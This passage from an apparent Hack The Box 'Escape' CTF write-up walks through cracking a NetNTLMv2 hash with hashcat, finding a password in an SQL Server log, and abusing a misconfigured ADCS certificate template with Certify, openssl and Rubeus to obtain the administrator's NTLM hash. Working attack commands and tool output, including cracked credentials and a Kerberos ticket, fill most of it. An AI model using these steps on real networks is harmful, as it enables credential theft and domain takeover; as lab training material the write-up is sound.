* Bytes.....: 27
* Keyspace..: 2
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.  

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: SQL_SVC::sequel:8537c9ab2d2f88f9:5422174e2c2dc68bd5...000000
Time.Started.....: Sat Apr 29 16:56:51 2023, (0 secs)
Time.Estimated...: Sat Apr 29 16:56:51 2023, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:     4010 H/s (0.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 2/2 (100.00%)
Rejected.........: 0/2 (0.00%)
Restore.Point....: 0/2 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 147258369 -> REGGIE1234ronnie

Started: Sat Apr 29 16:56:51 2023
Stopped: Sat Apr 29 16:56:53 2023
```

Once the hash was cracked, we can use it to connect to the machine via WINRM using `evil-winrm`

![](/img/Escape_059ec3bec324456ca5e1140eb7edc89f/Untitled_3.png)

Apparently, we still did not get the user flag, as expected. Now, starting off with the local enumeration of the machine, I found that there was a directory named `SQL Server` , checking the directory I saw that there was a `Logs` folder, downloading the log file from it for further checking:

```asm
*Evil-WinRM* PS C:\SQLServer> ls

    Directory: C:\SQLServer

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         2/7/2023   8:06 AM                Logs
d-----       11/18/2022   1:37 PM                SQLEXPR_2019
-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe

*Evil-WinRM* PS C:\SQLServer> cd Logs
*Evil-WinRM* PS C:\SQLServer\Logs> ls

    Directory: C:\SQLServer\Logs

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK

*Evil-WinRM* PS C:\SQLServer\Logs> download ERRORLOG.BAK
Info: Downloading ERRORLOG.BAK to ./ERRORLOG.BAK

                                                             
Info: Download successful!
```

Checking the log file for any interesting details, we can see that it contains password for `Ryan.Cooper` 

```asm
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Error: 18456, Severity: 14, State: 8.
2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.72 spid51      Attempting to load library 'xpstar.dll' into memory. This is an informational message only. No user action is required.
```

Using the credentials, we can connect via `evil-winrm` 

![](/img/Escape_059ec3bec324456ca5e1140eb7edc89f/Untitled_4.png)

Now, we can get the user flag:

```asm
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> cd ..\Desktop
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> dir

    Directory: C:\Users\Ryan.Cooper\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        4/29/2023   7:16 AM             34 user.txt

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Desktop> type user.txt
f682a2bd6615f9bf0a8500dfe5e45711
```

Now, since we know that this is more of an AD environment, best is to run `adPEAS.exe` to shorten down the manual enumeration. We see that it found that there is a ADCS service which is probably here indicating that this could be the “potential” way

```asm
[?] +++++ Searching for Active Directory Certificate Services Information +++++
[+] Found at least one available Active Directory Certificate Service
adPEAS does basic enumeration only, consider reading https://posts.specterops.io/certified-pre-owned-d95910965cd2

[+] Found Active Directory Certificate Services 'sequel-DC-CA':
CA Name:				sequel-DC-CA
CA dnshostname:				dc.sequel.htb
CA IP Address:				10.10.11.202
Date of Creation:			11/18/2022 21:08:46
DistinguishedName:			CN=sequel-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb
NTAuthCertificates:			True
Available Templates:			UserAuthentication
					DirectoryEmailReplication
					DomainControllerAuthentication
					KerberosAuthentication
					EFSRecovery
					EFS
					DomainController
					WebServer
					Machine
					User
					SubCA
					Administrator
```

Furthermore, we see that there is a certificate template named `UserAuthentication` and we seem to have `ENROLEE_SUPPLIES_SUBJECT` and `GenericAll` permission for `sql_svc` user, it also have the same permission for `Domain Users` as well which includes `Ryan.Cooper` 

```asm
[?] +++++ Searching for Vulnerable Certificate Templates +++++
adPEAS does basic enumeration only, consider using https://github.com/GhostPack/Certify or https://github.com/ly4k/Certipy

[?] +++++ Checking Template 'UserAuthentication' +++++
[!] Template 'UserAuthentication' has Flag 'ENROLLEE_SUPPLIES_SUBJECT'
[!] Identity 'sequel\sql_svc' has 'GenericAll' permissions on template 'UserAuthentication'
[+] Identity 'sequel\Domain Users' has enrollment rights for template 'UserAuthentication'
Template Name:				UserAuthentication
Template distinguishedname:		CN=UserAuthentication,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=sequel,DC=htb
Date of Creation:			11/18/2022 21:10:22
[+] Extended Key Usage:			Client Authentication, Secure E-mail, Encrypting File System
EnrollmentFlag:				INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
[!] CertificateNameFlag:		ENROLLEE_SUPPLIES_SUBJECT
[!] Template Permissions:		sequel\sql_svc : GenericAll
[+] Enrollment allowed for:		sequel\Domain Users
```

Now, since we know there is a vulnerable certificate template, we can use `Certify` to perform an attack, to confirm things once, we can try to get more information for the template.

```asm
*Evil-WinRM* PS C:\Users\Ryan.Cooper> .\Certify.exe find /vulnerable

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sequel,DC=htb'

[*] Listing info about the Enterprise CA 'sequel-DC-CA'

    Enterprise CA Name            : sequel-DC-CA
    DNS Hostname                  : dc.sequel.htb
    FullName                      : dc.sequel.htb\sequel-DC-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=sequel-DC-CA, DC=sequel, DC=htb
    Cert Thumbprint               : A263EA89CAFE503BB33513E359747FD262F91A56
    Cert Serial                   : 1EF2FA9A7E6EADAD4F5382F4CE283101
    Cert Start Date               : 11/18/2022 12:58:46 PM
    Cert End Date                 : 11/18/2121 1:08:46 PM
    Cert Chain                    : CN=sequel-DC-CA,DC=sequel,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : dc.sequel.htb\sequel-DC-CA
    Template Name                         : UserAuthentication
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email
    Permissions
      Enrollment Permissions
        Enrollment Rights           : sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Domain Users           S-1-5-21-4078382237-1492182817-2568127209-513
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
        WriteOwner Principals       : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : sequel\Administrator          S-1-5-21-4078382237-1492182817-2568127209-500
                                      sequel\Domain Admins          S-1-5-21-4078382237-1492182817-2568127209-512
                                      sequel\Enterprise Admins      S-1-5-21-4078382237-1492182817-2568127209-519
```

Now, what we can do here is first get the private key and then use `openssl` to convert it to the certificate file which will later be used to get the TGT for `administrator` 

```asm
Certify.exe request /ca:sequel-DC-CA /template:UserAuthentication /altname:administrator
```

Now, once we get the private key, we can just use `openssl` to convert it to the certificate (`.pfx`) file:

```asm
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

Next thing is to copy the `pfx` file back to the `sequel` machine and use `Certify` to request the TGT for the `administrator` from the forged certificate. Additionally, we can use `/getcredentials` flag for the `Rubeus` to get the NTLM hash of the `administrator` user:

```asm
*Evil-WinRM* PS C:\Users\Ryan.Cooper> .\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /ptt /nowrap /getcredentials

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.Cooper, CN=Users, DC=sequel, DC=htb
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::98a6:96af:75db:57b%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      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
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/sequel.htb
  ServiceRealm             :  SEQUEL.HTB
  UserName                 :  administrator
  UserRealm                :  SEQUEL.HTB
  StartTime                :  4/29/2023 7:42:27 PM
  EndTime                  :  4/30/2023 5:42:27 AM
  RenewTill                :  5/6/2023 7:42:27 PM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable
  KeyType                  :  rc4_hmac
  Base64(key)              :  qHPsHpdrs2PMVaIKod7JyA==
  ASREP (key)              :  C02394705382548D60B69D45405F2638

[*] Getting credentials using U2U

  CredentialInfo         :
    Version              : 0
    EncryptionType       : rc4_hmac
    CredentialData       :
      CredentialCount    : 1
       NTLM              : A52F78E4C751E5F5E17E1E9F3E58F4EE
```

![](/img/Escape_059ec3bec324456ca5e1140eb7edc89f/Untitled_5.png)

Now, we got the NTLM hash, we can again use `evil-winrm` and get the root flag:

![](/img/Escape_059ec3bec324456ca5e1140eb7edc89f/Untitled_6.png)

### References:

[https://0xdf.gitlab.io/2019/02/16/htb-giddy.html#get-net-ntlm](https://0xdf.gitlab.io/2019/02/16/htb-giddy.html#get-net-ntlm)

[https://0xdf.gitlab.io/2022/01/29/htb-anubis.html](https://0xdf.gitlab.io/2022/01/29/htb-anubis.html)

[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-misconfigured-certificate-template-to-domain-admin)

[Certificate Based Persistence > BorderGate](https://www.bordergate.co.uk/certificate-based-persistence/)


